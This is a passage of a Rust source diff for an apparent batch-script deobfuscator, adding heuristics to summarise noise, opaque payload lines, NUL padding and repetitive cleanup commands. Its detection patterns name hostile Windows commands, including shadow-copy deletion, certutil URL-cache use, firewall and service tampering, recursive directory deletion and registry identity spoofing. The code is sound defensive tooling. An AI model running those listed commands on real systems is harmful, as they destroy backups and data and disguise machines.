+        Some(rest) => rest.trim(),
+        None => return false,
+    };
+    let lower = payload.to_ascii_lowercase();
+    if !lower.ends_with("2>nul") {
+        return false;
+    }
+    let payload = payload
+        .trim_end()
+        .strip_suffix("2>nul")
+        .unwrap_or(payload)
+        .trim();
+    is_short_rendered_nul_sink_noise_payload(payload)
+}
+
+fn is_short_rendered_nul_sink_noise_payload(payload: &str) -> bool {
+    if payload.is_empty()
+        || payload.len() > 96
+        || payload.contains("://")
+        || payload.contains(['%', '!', '"', '<', '>', '|', '&', '\\'])
+    {
+        return false;
+    }
+    let mut alpha = 0usize;
+    let mut alnum = 0usize;
+    let mut printable = 0usize;
+    let mut total = 0usize;
+    for ch in payload.chars() {
+        total += 1;
+        if ch.is_ascii_alphabetic() {
+            alpha += 1;
+        }
+        if ch.is_ascii_alphanumeric() {
+            alnum += 1;
+        }
+        if ch.is_ascii_graphic() || ch.is_ascii_whitespace() {
+            printable += 1;
+        }
+    }
+    total > 0 && printable == total && alpha * 100 >= total * 50 && alnum * 100 >= total * 65
+}
+
+fn is_randomish_rendered_label_name(label: &str) -> bool {
+    let label = label.trim();
+    if label.len() < 10 || label.len() > 80 {
+        return false;
+    }
+    let lower = label.to_ascii_lowercase();
+    if matches!(
+        lower.as_str(),
+        "eof" | "end" | "loop" | "main" | "start" | "begin" | "exit" | "done"
+    ) {
+        return false;
+    }
+    label
+        .chars()
+        .all(|ch| ch.is_ascii_alphanumeric() || ch == '_')
+        && label.chars().any(|ch| ch.is_ascii_alphabetic())
+}
+
+fn strip_ascii_case_insensitive_keyword<'a>(text: &'a str, keyword: &str) -> Option<&'a str> {
+    let prefix = text.get(..keyword.len())?;
+    if !prefix.eq_ignore_ascii_case(keyword) {
+        return None;
+    }
+    let rest = text.get(keyword.len()..)?;
+    if rest
+        .chars()
+        .next()
+        .is_some_and(|ch| ch.is_ascii_alphanumeric() || ch == '_')
+    {
+        return None;
+    }
+    Some(rest)
+}
+
+fn split_ascii_case_insensitive_once<'a>(
+    text: &'a str,
+    needle: &str,
+) -> Option<(&'a str, &'a str)> {
+    let lower_text = text.to_ascii_lowercase();
+    let lower_needle = needle.to_ascii_lowercase();
+    let idx = lower_text.find(&lower_needle)?;
+    Some((&text[..idx], &text[idx + needle.len()..]))
+}
+
+fn summarize_dense_plain_word_salad_lines(text: &str, env: &mut Environment) -> Option<String> {
+    let mut total_lines = 0usize;
+    let mut total_bytes = 0usize;
+    for line in text.lines() {
+        if is_rendered_plain_word_salad_noise_line(line) {
+            total_lines += 1;
+            total_bytes += line.len();
+        }
+    }
+    if total_lines < 16 || total_bytes < 512 {
+        return None;
+    }
+
+    let mut out = String::with_capacity(text.len().min(512 * 1024));
+    let mut omitted_lines = 0usize;
+    let mut omitted_bytes = 0usize;
+    let mut summary_inserted = false;
+
+    for chunk in text.split_inclusive('\n') {
+        let (body, ending) = split_line_ending(chunk);
+        if is_rendered_plain_word_salad_noise_line(body) {
+            if !summary_inserted {
+                out.push_str(&format!(
+                    "rem omitted {total_lines} plain word-salad noise lines ({total_bytes} bytes){ending}"
+                ));
+                summary_inserted = true;
+            }
+            rescue_truncated_urls(body, body.len(), env);
+            omitted_lines += 1;
+            omitted_bytes += chunk.len();
+            continue;
+        }
+        out.push_str(chunk);
+    }
+
+    if omitted_lines > 0 {
+        env.traits.push(crate::traits::Trait::LineTruncated {
+            original_len: omitted_bytes as u64,
+        });
+        Some(out)
+    } else {
+        None
+    }
+}
+
+fn summarize_dense_unknown_bare_command_noise_lines(
+    text: &str,
+    env: &mut Environment,
+) -> Option<String> {
+    let mut total_lines = 0usize;
+    let mut total_bytes = 0usize;
+    for line in text.lines() {
+        if is_unknown_bare_command_noise_line(line) {
+            total_lines += 1;
+            total_bytes += line.len();
+        }
+    }
+    if total_lines < 32 || total_bytes < 256 {
+        return None;
+    }
+
+    let mut out = String::with_capacity(text.len().min(512 * 1024));
+    let mut omitted_lines = 0usize;
+    let mut omitted_bytes = 0usize;
+    let mut summary_inserted = false;
+
+    for chunk in text.split_inclusive('\n') {
+        let (body, ending) = split_line_ending(chunk);
+        if is_unknown_bare_command_noise_line(body) {
+            if !summary_inserted {
+                out.push_str(&format!(
+                    "rem omitted {total_lines} unknown bare command noise lines ({total_bytes} bytes){ending}"
+                ));
+                summary_inserted = true;
+            }
+            rescue_truncated_urls(body, body.len(), env);
+            omitted_lines += 1;
+            omitted_bytes += chunk.len();
+            continue;
+        }
+        out.push_str(chunk);
+    }
+
+    if omitted_lines > 0 {
+        env.traits.push(crate::traits::Trait::LineTruncated {
+            original_len: omitted_bytes as u64,
+        });
+        Some(out)
+    } else {
+        None
+    }
+}
+
+fn is_unknown_bare_command_noise_line(line: &str) -> bool {
+    let trimmed = line.trim();
+    if trimmed.len() < 2
+        || trimmed.len() > 96
+        || trimmed.contains("://")
+        || trimmed.contains([
+            '%', '!', '"', '\'', '<', '>', '|', '&', '=', '\\', '/', '.', ':',
+        ])
+    {
+        return false;
+    }
+    if !trimmed
+        .chars()
+        .all(|ch| ch.is_ascii_alphanumeric() || ch.is_ascii_whitespace() || ch == '-' || ch == '_')
+    {
+        return false;
+    }
+    if !trimmed.chars().any(|ch| ch.is_ascii_alphabetic()) {
+        return false;
+    }
+    if let Some(name) = interp::command_name(trimmed) {
+        let name = name.to_ascii_lowercase();
+        if crate::handlers::lookup(&name).is_some() || is_preserved_bare_command_name(&name) {
+            return false;
+        }
+    }
+    true
+}
+
+fn is_preserved_bare_command_name(name: &str) -> bool {
+    matches!(
+        name,
+        "assoc"
+            | "attrib"
+            | "bitsadmin"
+            | "call"
+            | "cd"
+            | "certutil"
+            | "choice"
+            | "cmd"
+            | "copy"
+            | "curl"
+            | "del"
+            | "dir"
+            | "echo"
+            | "endlocal"
+            | "erase"
+            | "exit"
+            | "expand"
+            | "extrac32"
+            | "find"
+            | "findstr"
+            | "for"
+            | "goto"
+            | "if"
+            | "md"
+            | "mkdir"
+            | "move"
+            | "mshta"
+            | "ping"
+            | "powershell"
+            | "pushd"
+            | "reg"
+            | "ren"
+            | "rename"
+            | "rmdir"
+            | "robocopy"
+            | "set"
+            | "setlocal"
+            | "start"
+            | "taskkill"
+            | "tasklist"
+            | "timeout"
+            | "type"
+            | "wmic"
+            | "xcopy"
+    )
+}
+
+fn is_rendered_plain_word_salad_noise_line(line: &str) -> bool {
+    let trimmed = line.trim();
+    if trimmed.is_empty()
+        || trimmed.contains("://")
+        || trimmed.contains(r"\\")
+        || trimmed.contains(['%', '!', '/', '\\', '.', ':', '=', '<', '>', '|', '&', '"'])
+    {
+        return false;
+    }
+    if let Some(name) = interp::command_name(trimmed) {
+        if crate::handlers::lookup(&name).is_some() {
+            return false;
+        }
+    }
+    if !trimmed
+        .chars()
+        .all(|c| c.is_ascii_alphanumeric() || c.is_ascii_whitespace() || c == '-' || c == '(')
+    {
+        return false;
+    }
+
+    let non_space = trimmed.chars().filter(|c| !c.is_ascii_whitespace()).count();
+    let alpha = trimmed.chars().filter(|c| c.is_ascii_alphabetic()).count();
+    if non_space == 0 || alpha * 100 < non_space * 70 {
+        return false;
+    }
+    let whitespace_words = trimmed.split_whitespace().count();
+    let hyphen_words = trimmed.split('-').filter(|part| !part.is_empty()).count();
+    whitespace_words >= 3
+        || hyphen_words >= 3
+        || trimmed.len() >= 40
+        || is_parenthesized_word_salad_noise_line(trimmed)
+}
+
+fn is_parenthesized_word_salad_noise_line(trimmed: &str) -> bool {
+    if !trimmed.contains('(')
+        || trimmed.contains(')')
+        || !trimmed.ends_with('(')
+        || trimmed.len() > 160
+    {
+        return false;
+    }
+    let mut segments = 0usize;
+    let mut alpha = 0usize;
+    let mut alnum = 0usize;
+    for segment in trimmed.split('(') {
+        let segment = segment.trim();
+        if segment.is_empty() {
+            continue;
+        }
+        if segment.len() > 32
+            || !segment
+                .chars()
+                .all(|ch| ch.is_ascii_alphanumeric() || ch == '_' || ch == '-')
+            || !segment.chars().any(|ch| ch.is_ascii_alphabetic())
+        {
+            return false;
+        }
+        if segments == 0 {
+            let command = segment.to_ascii_lowercase();
+            if crate::handlers::lookup(&command).is_some()
+                || is_preserved_bare_command_name(&command)
+            {
+                return false;
+            }
+        }
+        segments += 1;
+        alpha += segment
+            .chars()
+            .filter(|ch| ch.is_ascii_alphabetic())
+            .count();
+        alnum += segment
+            .chars()
+            .filter(|ch| ch.is_ascii_alphanumeric())
+            .count();
+    }
+    segments >= 1 && alpha * 100 >= alnum * 70
+}
+
+fn extract_noisy_pem_base64_between(text: &str, begin: &str, end: &str) -> Option<String> {
+    let after_begin = text.find(begin).map(|idx| idx + begin.len())?;
+    let before_end = text[after_begin..].find(end).map(|idx| after_begin + idx)?;
+    let mut out = String::new();
+    for line in text[after_begin..before_end].lines() {
+        out.extend(
+            line.bytes()
+                .filter(|b| is_base64_carrier_byte(*b))
+                .map(char::from),
+        );
+    }
+    (!out.is_empty()).then_some(out)
+}
+
+fn summarize_opaque_payload_line(line: &str, env: &mut Environment, out: &mut String) -> bool {
+    if !is_opaque_payload_line(line) {
+        return false;
+    }
+    rescue_truncated_urls(line, line.len(), env);
+    env.traits.push(crate::traits::Trait::LineTruncated {
+        original_len: line.len() as u64,
+    });
+    out.push_str(&format!("rem omitted {} opaque payload bytes", line.len()));
+    true
+}
+
+fn append_unrendered_omission_summaries(summarized_text: &str, out: &mut String) {
+    for line in summarized_text.lines() {
+        let trimmed = line.trim();
+        if trimmed.starts_with("rem omitted ") && !out.contains(trimmed) {
+            if !out.ends_with('\n') && !out.is_empty() {
+                out.push_str("\r\n");
+            }
+            out.push_str(trimmed);
+            out.push_str("\r\n");
+        }
+    }
+}
+
+fn is_tail_terminal_line(line: &str) -> bool {
+    let trimmed = line
+        .trim_start()
+        .trim_start_matches('@')
+        .trim_start()
+        .to_ascii_lowercase();
+    trimmed == "exit"
+        || trimmed == "exit /b"
+        || trimmed.starts_with("exit /b ")
+        || trimmed == "goto :eof"
+}
+
+fn is_opaque_payload_line(line: &str) -> bool {
+    const MIN_OPAQUE_PAYLOAD_BYTES: usize = 64 * 1024;
+
+    let trimmed = line.trim();
+    if trimmed.len() < MIN_OPAQUE_PAYLOAD_BYTES || trimmed.len() != line.len() {
+        return false;
+    }
+    if trimmed.bytes().all(is_base64_carrier_byte) {
+        return false;
+    }
+    if trimmed.bytes().any(|b| b.is_ascii_whitespace()) {
+        return false;
+    }
+
+    let carrier = trimmed
+        .bytes()
+        .filter(|b| {
+            b.is_ascii_alphanumeric()
+                || matches!(*b, b'+' | b'/' | b'=' | b'_' | b'-' | b'#' | b'@')
+        })
+        .count();
+    carrier * 100 >= trimmed.len() * 98
+}
+
+fn is_huge_post_terminal_opaque_payload_line(line: &str) -> bool {
+    const MIN_HUGE_POST_TERMINAL_PAYLOAD_BYTES: usize = 256 * 1024;
+    const SAMPLE_BYTES: usize = 4096;
+
+    if line.len() < MIN_HUGE_POST_TERMINAL_PAYLOAD_BYTES || line.trim().len() != line.len() {
+        return false;
+    }
+
+    if let Some(prefix) = line.get(..line.len().min(256)) {
+        let commandish_prefix = prefix.trim_start_matches('@').trim_start();
+        if let Some(name) = interp::command_name(commandish_prefix) {
+            if crate::handlers::lookup(&name).is_some() {
+                return false;
+            }
+        }
+    }
+
+    let bytes = line.as_bytes();
+    let mut sampled = 0usize;
+    let mut carrier = 0usize;
+    let mut saw_marker = false;
+
+    for (start, end) in huge_line_sample_ranges(bytes.len(), SAMPLE_BYTES) {
+        for byte in &bytes[start..end] {
+            sampled += 1;
+            if byte.is_ascii_whitespace() {
+                return false;
+            }
+            if matches!(*byte, b'#' | b'@') {
+                saw_marker = true;
+            }
+            if byte.is_ascii_alphanumeric()
+                || matches!(*byte, b'+' | b'/' | b'=' | b'_' | b'-' | b'#' | b'@')
+            {
+                carrier += 1;
+            }
+        }
+    }
+
+    sampled > 0 && saw_marker && carrier * 100 >= sampled * 98
+}
+
+fn huge_line_sample_ranges(len: usize, sample_bytes: usize) -> [(usize, usize); 3] {
+    let first_end = len.min(sample_bytes);
+    let middle_start = len.saturating_sub(sample_bytes) / 2;
+    let middle_end = (middle_start + sample_bytes).min(len);
+    let tail_start = len.saturating_sub(sample_bytes);
+    [
+        (0, first_end),
+        (middle_start, middle_end),
+        (tail_start, len),
+    ]
+}
+
+fn has_opaque_payload_marker(line: &str) -> bool {
+    line.as_bytes().iter().any(|b| matches!(*b, b'#' | b'@'))
+}
+
 fn summarize_inert_binary_noise_line(line: &str, env: &mut Environment, out: &mut String) -> bool {
     const MIN_NUL_PADDING_BYTES: usize = 1024;
     if line.len() < MIN_NUL_PADDING_BYTES {
@@ -10576,14 +24299,255 @@ fn summarize_inert_binary_noise_line(line: &str, env: &mut Environment, out: &mu
     if nul_count * 100 < line.len() * 90 {
         return false;
     }
+    render_inert_nul_padding_summary(line.len(), env, out);
+    true
+}
+
+fn split_inert_nul_padding_suffix(line: &str) -> Option<(&str, usize)> {
+    const MIN_NUL_PADDING_BYTES: usize = 1024;
+    let bytes = line.as_bytes();
+    let first_nul = bytes.iter().position(|byte| *byte == 0)?;
+    let padding_len = bytes.len() - first_nul;
+    if padding_len < MIN_NUL_PADDING_BYTES {
+        return None;
+    }
+    if !bytes[first_nul..].iter().all(|byte| *byte == 0) {
+        return None;
+    }
+    Some((&line[..first_nul], padding_len))
+}
+
+fn trim_inert_nul_padding_suffix_text(text: &str) -> &str {
+    split_inert_nul_padding_suffix(text)
+        .map(|(prefix, _)| prefix)
+        .unwrap_or(text)
+}
+
+fn split_inert_nul_padding_suffix_bytes(input: &[u8]) -> Option<(&[u8], usize)> {
+    const MIN_NUL_PADDING_BYTES: usize = 1024;
+    let first_nul = input.iter().position(|byte| *byte == 0)?;
+    let padding_len = input.len() - first_nul;
+    if padding_len < MIN_NUL_PADDING_BYTES {
+        return None;
+    }
+    if !input[first_nul..].iter().all(|byte| *byte == 0) {
+        return None;
+    }
+    Some((&input[..first_nul], padding_len))
+}
+
+fn render_inert_nul_padding_summary(padding_len: usize, env: &mut Environment, out: &mut String) {
     env.traits.push(crate::traits::Trait::LineTruncated {
-        original_len: line.len() as u64,
+        original_len: padding_len as u64,
+    });
+    out.push_str(&format!("rem omitted {padding_len} NUL padding bytes"));
+}
+
+fn summarize_repetitive_admin_cleanup_lines(text: &str, env: &mut Environment) -> String {
+    const KEEP_PREFIX_LINES: usize = 24;
+    const MIN_RUN_LINES: usize = 64;
+
+    let mut out = String::with_capacity(text.len().min(512 * 1024));
+    let mut run: Vec<&str> = Vec::new();
+
+    for line in text.split_inclusive('\n') {
+        let (body, _) = split_line_ending(line);
+        if is_repetitive_admin_cleanup_line(body) {
+            run.push(line);
+            continue;
+        }
+        flush_repetitive_admin_cleanup_run(&mut out, &mut run, KEEP_PREFIX_LINES, MIN_RUN_LINES);
+        out.push_str(line);
+    }
+    flush_repetitive_admin_cleanup_run(&mut out, &mut run, KEEP_PREFIX_LINES, MIN_RUN_LINES);
+
+    summarize_dense_admin_cleanup_lines(&out, env)
+}
+
+fn flush_repetitive_admin_cleanup_run(
+    out: &mut String,
+    run: &mut Vec<&str>,
+    keep_prefix_lines: usize,
+    min_run_lines: usize,
+) {
+    if run.is_empty() {
+        return;
+    }
+    if run.len() < min_run_lines {
+        for line in run.drain(..) {
+            out.push_str(line);
+        }
+        return;
+    }
+
+    let keep = keep_prefix_lines.min(run.len());
+    for line in run.iter().take(keep) {
+        out.push_str(line);
+    }
+    out.push_str(&format!(
+        "rem omitted {} repetitive admin cleanup commands\r\n",
+        run.len() - keep
+    ));
+    run.clear();
+}
+
+fn is_repetitive_admin_cleanup_line(line: &str) -> bool {
+    let trimmed = line
+        .trim_start()
+        .trim_start_matches('@')
+        .trim_start()
+        .trim_start_matches('(')
+        .trim_start();
+    let lower = trimmed.to_ascii_lowercase();
+    lower.starts_with("reg delete ")
+        || lower.starts_with("reg.exe delete ")
+        || lower.starts_with("reg add ")
+        || lower.starts_with("reg.exe add ")
+        || lower.starts_with("rmdir ")
+        || lower.starts_with("rd ")
+        || lower.starts_with("del ")
+        || lower.starts_with("erase ")
+        || lower.starts_with("taskkill ")
+        || lower.starts_with("taskkill.exe ")
+        || is_registry_identity_spoofing_line(&lower)
+        || is_broken_registry_hardware_fragment_line(&lower)
+        || lower.starts_with("netsh advfirewall ")
+        || lower.starts_with("netsh int ")
+        || lower.starts_with("netsh interface ")
+        || lower.starts_with("ipconfig /release")
+        || lower.starts_with("ipconfig /renew")
+        || lower.starts_with("ipconfig /flushdns")
+        || lower.starts_with("certutil -urlcache ")
+        || lower.starts_with("vssadmin delete shadows")
+        || lower.starts_with("rundll32.exe inetcpl.cpl,clearmytracksbyprocess")
+        || lower.starts_with("ipconfig /flushdns")
+        || lower.starts_with("sc delete ")
+        || lower.starts_with("sc.exe delete ")
+        || lower.starts_with("sc stop ")
+        || lower.starts_with("sc.exe stop ")
+        || lower.starts_with("sc config ")
+        || lower.starts_with("sc.exe config ")
+        || lower.starts_with("net stop ")
+        || is_for_d_directory_cleanup_line(&lower)
+}
+
+fn is_registry_identity_spoofing_line(lower: &str) -> bool {
+    if !(lower.starts_with("reg add ") || lower.starts_with("reg.exe add ")) {
+        return false;
+    }
+    if !lower.contains(" /f") {
+        return false;
+    }
+    const IDENTITY_MARKERS: &[&str] = &[
+        "\\microsoft\\cryptography",
+        "\\control\\computername\\",
+        "\\control\\idconfigdb\\hardware",
+        "\\control\\systeminformation",
+        "\\hardwareconfig",
+        "\\windows nt\\currentversion",
+        "\\windows\"\" \"\"nt\\currentversion",
+        "\\windowsupdate",
+        "\\windows\\currentversion\"\" \"\"windowsupdate",
+        "\\control\\wmi\\security",
+        "\\configuration\\variables\\",
+    ];
+    const VALUE_MARKERS: &[&str] = &[
+        " /v machineguid ",
+        " /v guid ",
+        " /v hwprofileguid ",
+        " /v comput_name ",
+        " /v computername ",
+        " /v computerhardwareid ",
+        " /v buildguid ",
+        " /v buildguidex ",
+        " /v registeredowner ",
+        " /v registeredorganization ",
+        " /v productid ",
+        " /v installdate ",
+        " /v susclientid ",
+        " /v lastconfig ",
+        " /v propertyguid ",
+    ];
+    IDENTITY_MARKERS.iter().any(|marker| lower.contains(marker))
+        && VALUE_MARKERS.iter().any(|marker| lower.contains(marker))
+}
+
+fn is_broken_registry_hardware_fragment_line(lower: &str) -> bool {
+    let trimmed = lower.trim_matches('"').trim();
+    trimmed.starts_with("ven_")
+        || trimmed.starts_with("dev_")
+        || trimmed.starts_with("subsys_")
+        || (trimmed.starts_with("rev_")
+            && (trimmed.contains("\\singlelineouttopo")
+                || trimmed.contains("\\device\\harddiskvolume")
+                || trimmed.ends_with(" /f")))
+        || matches!(
+            trimmed,
+            "visual studio\"\"\"\" /f"
+                | "display settings\"\"\"\" /f"
+                | "rsonalize\"\"\"\" /f"
+                | "personalize\"\"\"\" /f"
+        )
+}
+
+fn summarize_dense_admin_cleanup_lines(text: &str, env: &mut Environment) -> String {
+    let cleanup_lines = text
+        .lines()
+        .filter(|line| is_repetitive_admin_cleanup_line(line))
+        .count();
+    let total_lines = text.lines().count().max(1);
+    if cleanup_lines < 96 || cleanup_lines * 100 < total_lines * 50 {
+        return text.to_string();
+    }
+
+    let mut out = String::with_capacity(text.len().min(512 * 1024));
+    let mut kept = 0usize;
+    let mut omitted = 0usize;
+    let mut omitted_bytes = 0usize;
+    let mut summary_inserted = false;
+    for line in text.split_inclusive('\n') {
+        let (body, ending) = split_line_ending(line);
+        if is_repetitive_admin_cleanup_line(body) {
+            if kept < 48 {
+                kept += 1;
+                out.push_str(line);
+            } else {
+                if !summary_inserted {
+                    out.push_str(&format!(
+                        "rem omitted dense admin cleanup command lines{}",
+                        ending
+                    ));
+                    summary_inserted = true;
+                }
+                omitted += 1;
+                omitted_bytes += line.len();
+            }
+            continue;
+        }
+        out.push_str(line);
+    }
+
+    if omitted == 0 {
+        return text.to_string();
+    }
+    env.traits.push(crate::traits::Trait::LineTruncated {
+        original_len: omitted_bytes as u64,
     });
     out.push_str(&format!(
-        "::==== harrington: omitted {} NUL padding bytes ====",
-        line.len()
+        "rem omitted {omitted} dense admin cleanup command lines ({omitted_bytes} bytes)\r\n"
     ));
-    true
+    out
+}
+
+fn is_for_d_directory_cleanup_line(lower: &str) -> bool {
+    lower.starts_with("for /d ")
+        && lower.contains(" do ")
+        && (lower.contains(" do @rd ")
+            || lower.contains(" do rd ")
+            || lower.contains(" do @rmdir ")
+            || lower.contains(" do rmdir "))
+        && (lower.contains(" /s") || lower.contains(" -s"))
+        && (lower.contains(" /q") || lower.contains(" -q"))
 }
 
 fn flush_binary_noise_run(
@@ -10595,10 +24559,10 @@ fn flush_binary_noise_run(
     if pending.is_empty() {
         return;
     }
-    if *pending_lines >= 32 && pending.len() >= 1024 {
+    if *pending_lines >= 8 && pending.len() >= 512 {
         rescue_truncated_urls(pending, pending.len(), env);
         out.push_str(&format!(
-            "::==== harrington: omitted {} binary-looking lines ({} bytes) ====\r\n",
+            "rem omitted {} binary-looking lines ({} bytes)\r\n",
             *pending_lines,
             pending.len()
         ));
@@ -10614,12 +24578,96 @@ fn is_binary_noise_line(line: &str) -> bool {
     if trimmed.is_empty() || trimmed.len() < 4 {
         return false;
     }
+    if looks_like_marker_substring_assignment_line(trimmed) {
+        return false;
+    }
+    if let Some(name) = interp::command_name(trimmed) {
+        if crate::handlers::lookup(&name).is_some() {
+            return false;
+        }
+    }
     let bytes = trimmed.as_bytes();
     let suspicious = bytes
         .iter()
         .filter(|&&b| (b < 0x20 && b != b'\t') || b >= 0x7f)
         .count();
-    suspicious * 3 >= bytes.len()
+    suspicious * 3 >= bytes.len() || (suspicious >= 4 && suspicious * 10 >= bytes.len())
+}
+
+fn looks_like_marker_substring_assignment_line(trimmed: &str) -> bool {
+    if trimmed.starts_with("::")
+        || !trimmed.contains('%')
+        || !trimmed.contains(":~")
+        || !trimmed.contains('=')
+    {
+        return false;
+    }
+    let Some(first_quote) = trimmed.find('"') else {
+        return false;
+    };
+    let Some(last_quote) = trimmed.rfind('"') else {
+        return false;
+    };
+    if first_quote == last_quote {
+        return false;
+    }
+    let quoted = &trimmed[first_quote + 1..last_quote];
+    let Some(eq_idx) = quoted.find('=') else {
+        return false;
+    };
+    if eq_idx == 0 || eq_idx + 1 >= quoted.len() {
+        return false;
+    }
+    let value = &quoted[eq_idx + 1..];
+    value.contains("://")
+        || value.contains('\\')
+        || value.contains('/')
+        || value.contains("%USERPROFILE%")
+        || value.contains("%APPDATA%")
+        || (has_percent_substring_carrier_shape(trimmed) && looks_like_marker_alphabet_value(value))
+}
+
+fn looks_like_marker_alphabet_value(value: &str) -> bool {
+    let value = value.trim();
+    if !(32..=256).contains(&value.len()) {
+        return false;
+    }
+    if !value
+        .bytes()
+        .all(|b| b == b'\t' || (0x20..=0x7e).contains(&b))
+    {
+        return false;
+    }
+    let mut distinct = [false; 128];
+    let mut distinct_count = 0usize;
+    let mut useful = 0usize;
+    for byte in value.bytes() {
+        if byte.is_ascii_alphanumeric() || matches!(byte, b' ' | b'@' | b'_' | b'-') {
+            useful += 1;
+        }
+        let idx = byte as usize;
+        if idx < distinct.len() && !distinct[idx] {
+            distinct[idx] = true;
+            distinct_count += 1;
+        }
+    }
+    useful * 100 >= value.len() * 85 && distinct_count >= 24
+}
+
+fn preconsume_binary_noise_marker_set_carrier(line: &str, env: &mut Environment) {
+    let trimmed = line.trim();
+    if !has_percent_substring_carrier_shape(trimmed) || !trimmed.contains('"') {
+        return;
+    }
+    let toks = lex::lex(trimmed);
+    let normalized = normalize::normalize_to_string(&toks, env);
+    let Some(name) = interp::command_name(&normalized) else {
+        return;
+    };
+    if !name.eq_ignore_ascii_case("set") {
+        return;
+    }
+    interp::interpret_line(&normalized, env);
 }
 
 /// Extract `http(s)/ftp/file` URLs from a fragment that's about to be
@@ -10628,6 +24676,9 @@ fn is_binary_noise_line(line: &str) -> bool {
 /// so analyst output stays consistent.
 fn rescue_truncated_urls(tail: &str, full_len: usize, env: &mut Environment) {
     use crate::deob_scan::{is_noise_url, is_noise_url_context, URL_RE};
+    if !tail.contains("://") {
+        return;
+    }
     let known = env.known_extracted_urls();
     let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
     for caps in URL_RE.captures_iter(tail) {
@@ -10649,6 +24700,44 @@ fn rescue_truncated_urls(tail: &str, full_len: usize, env: &mut Environment) {
             line_hint,
         });
     }
+}
+
+fn unresolved_parenthesized_if_opener(line: &str) -> bool {
+    let trimmed = line.trim_start().trim_start_matches('@').trim_start();
+    crate::util::starts_with_ascii_case_insensitive(trimmed, "if ")
+        && trimmed.trim_end().ends_with('(')
+}
+
+fn parenthesis_depth_delta(line: &str) -> i32 {
+    let mut delta = 0i32;
+    let mut quote: Option<char> = None;
+    let mut escaped = false;
+    for ch in line.chars() {
+        if escaped {
+            escaped = false;
+            continue;
+        }
+        if ch == '^' {
+            escaped = true;
+            continue;
+        }
+        if let Some(q) = quote {
+            if ch == q {
+                quote = None;
+            }
+            continue;
+        }
+        if ch == '"' || ch == '\'' {
+            quote = Some(ch);
+            continue;
+        }
+        match ch {
+            '(' => delta += 1,
+            ')' => delta -= 1,
+            _ => {}
+        }
+    }
+    delta
 }
 
 fn drive(input: &[u8], env: &mut Environment, out: &mut String) {
@@ -10677,10 +24766,12 @@ fn drive(input: &[u8], env: &mut Environment, out: &mut String) {
     env.label_index = labels::build_label_index(&lines);
 
     let mut cursor = 0usize;
+    let mut after_top_level_halt = false;
     // High-water mark: the furthest line index we have linearly advanced past.
     // Used to prevent re-executing subroutine bodies when a top-level
     // PopFrame/Halt continues scanning (rather than halting).
     let mut high_water_mark = 0usize;
+    let mut unresolved_if_block_depth = 0i32;
     while cursor < lines.len() {
         // Deadline check — emit TimeoutHit once and break
         if let Some(d) = env.limits.deadline {
@@ -10698,7 +24789,38 @@ fn drive(input: &[u8], env: &mut Environment, out: &mut String) {
         }
 
         env.current_line = Some(cursor);
-        let logical = &lines[cursor];
+        let logical_raw = &lines[cursor];
+        let mut inert_nul_padding_suffix_len = None;
+        let logical_storage;
+        let logical =
+            if let Some((prefix, padding_len)) = split_inert_nul_padding_suffix(logical_raw) {
+                let prefix = prefix.trim_end_matches([' ', '\t']);
+                if prefix.trim().is_empty() {
+                    render_inert_nul_padding_summary(padding_len, env, out);
+                    out.push_str("\r\n");
+                    cursor += 1;
+                    continue;
+                }
+                inert_nul_padding_suffix_len = Some(padding_len);
+                logical_storage = prefix.to_string();
+                logical_storage.as_str()
+            } else {
+                logical_raw.as_str()
+            };
+
+        if unresolved_if_block_depth > 0 {
+            let toks = lex::lex(logical);
+            let normalized = normalize::normalize_to_string(&toks, env);
+            let normalized_capped = cap_line(normalized, env);
+            out.push_str(&normalized_capped);
+            out.push_str("\r\n");
+            unresolved_if_block_depth += parenthesis_depth_delta(logical);
+            if unresolved_if_block_depth < 0 {
+                unresolved_if_block_depth = 0;
+            }
+            cursor += 1;
+            continue;
+        }
 
         // Label-only lines and `rem` comments aren't interpreted, but we
         // still echo `:label` lines to the deob output — analysts need
@@ -10716,6 +24838,10 @@ fn drive(input: &[u8], env: &mut Environment, out: &mut String) {
                     out.push_str(trimmed);
                     out.push_str("\r\n");
                 }
+            }
+            if let Some(padding_len) = inert_nul_padding_suffix_len {
+                render_inert_nul_padding_summary(padding_len, env, out);
+                out.push_str("\r\n");
             }
             cursor += 1;
             continue;
@@ -10761,13 +24887,55 @@ fn drive(input: &[u8], env: &mut Environment, out: &mut String) {
         let mut top_level_exit = false;
 
         if !env.suppress_until_eol {
+            let early_commands = split::split_commands(logical);
+            if early_commands.len() == 1 {
+                if let Some(pre) = interp::pre_dispatch_raw_marker_set(&early_commands[0], env) {
+                    if pre.consumed && pre.suppress_normalized_output {
+                        cursor += 1;
+                        continue;
+                    }
+                }
+            }
             let fast_normalized = fast_expand_percent_substr_chain_line(logical, env)
                 .or_else(|| fast_expand_percent_var_chain_line(logical, env));
             if let Some(fast) = fast_normalized {
+                if let Some(summary) = summarize_long_alpha_echo_line(&fast, env) {
+                    if !line_output_elided {
+                        out.push_str(&summary);
+                        out.push_str("\r\n");
+                    }
+                    cursor += 1;
+                    continue;
+                }
                 if render_fast_percent_chain_logical_line(&fast, env, out, line_output_elided) {
                     cursor += 1;
                     continue;
                 }
+                if render_fast_percent_substr_noise_line(
+                    &fast,
+                    logical.len(),
+                    env,
+                    out,
+                    line_output_elided,
+                ) {
+                    cursor += 1;
+                    continue;
+                }
+            }
+            let marker_prefixes = if logical.trim().len() >= 4096 {
+                self_read_marker_prefixes(out)
+            } else {
+                Vec::new()
+            };
+            if render_known_marker_base64_carrier_line(
+                logical,
+                &marker_prefixes,
+                env,
+                out,
+                line_output_elided,
+            ) {
+                cursor += 1;
+                continue;
             }
         }
 
@@ -10775,6 +24943,16 @@ fn drive(input: &[u8], env: &mut Environment, out: &mut String) {
             vec![logical.trim().to_string()]
         } else {
             split::split_commands(logical)
+        };
+        let suppress_set_dictionary_output = logical_line_is_single_char_set_dictionary(&commands);
+        let suppress_setp_staging_output = logical_line_builds_setp_payload(logical, &commands);
+        let if_not_resolved_before = if unresolved_parenthesized_if_opener(logical) {
+            env.traits
+                .iter()
+                .filter(|trait_| matches!(trait_, Trait::IfNotResolved { .. }))
+                .count()
+        } else {
+            usize::MAX
         };
 
         'cmds: for cmd in commands {
@@ -10790,10 +24968,44 @@ fn drive(input: &[u8], env: &mut Environment, out: &mut String) {
 
             // Single pre-normalize dispatch hook: handles FOR loops (raw %%A)
             // and cmd /c child extraction (raw var refs) in one typed call.
-            let pre = interp::pre_dispatch(&cmd, env);
+            let raw_marker_set_pre = interp::pre_dispatch_raw_marker_set(&cmd, env);
+            let raw_marker_set_consumed = raw_marker_set_pre.is_some();
